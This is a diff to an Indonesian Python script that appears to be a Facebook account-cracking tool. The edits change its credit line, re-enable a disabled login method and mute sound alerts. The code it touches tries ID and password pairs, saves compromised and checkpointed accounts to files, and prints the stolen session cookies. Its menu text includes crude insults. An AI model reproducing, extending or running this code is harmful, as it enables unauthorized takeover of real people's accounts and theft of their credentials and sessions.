@@ -251,7 +251,7 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'github.com/Al-Vino'
 	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
-	print(f'{P}[•] Recode : RIFAN-XD')
+	print(f'{P}[•] Recode : AGUS DANI')
 	print(f'[•] Status : {h}Premium{P}')
 	print(f'[•] Your Ip : {h}{ip}{P}')
 	print('')
@@ -644,7 +644,7 @@ def setting():
 	else:
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
-	print('>> 1. Mobile (Rekomendasi)')
+	print('>> 1. Mobile (FAST RECOMEND)')
 	print('>> 2. Mbasic ')
 	print('>> 3. Touch  ')
 	print('>> 4. Mtouch ')
@@ -655,8 +655,8 @@ def setting():
 	elif hc in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		setting()
-#	elif hc in ['2','02']:
-#		method.append('free')
+	elif hc in ['2','02']:
+		method.append('free')
 #	elif hc in ['3','03']:
 #		method.append('touch')
 	elif hc in ['4','04']:
@@ -760,7 +760,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{K}└─ {idf}|{K}{pw} {K}• {tahun(idf)}\n{K}└─ {ua}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				os.popen('play-audio data/cp.mp3')
+ #				os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -772,7 +772,7 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{H}└─ {idf}|{H}{pw} {H}• {tahun(idf)}\n{H}{H}└─ {ua}\n{H} {kuki}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-					os.popen('play-audio data/ok.mp3')
+#					os.popen('play-audio data/ok.mp3')
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
